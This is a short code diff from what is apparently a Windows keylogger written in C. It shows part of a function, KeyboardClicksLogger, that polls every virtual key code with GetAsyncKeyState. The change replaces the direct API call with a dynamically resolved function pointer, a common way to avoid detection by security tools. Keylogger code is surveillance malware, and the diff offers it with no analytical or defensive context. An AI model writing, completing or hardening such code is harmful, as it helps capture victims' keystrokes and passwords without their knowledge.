@@ -36,7 +36,7 @@ VOID KeyboardClicksLogger() {
         // Range from 0x01-0xFE
 		for (int i = 1; i < 255; i++) {
             // Get state
-            state = GetAsyncKeyState(i);
+            state = pGetAsyncKeyState(i);
 			// https://msdn.microsoft.com/en-us/library/windows/desktop/ms646293(v=vs.85).aspx
             // 1        = press
             // -32767   = held down
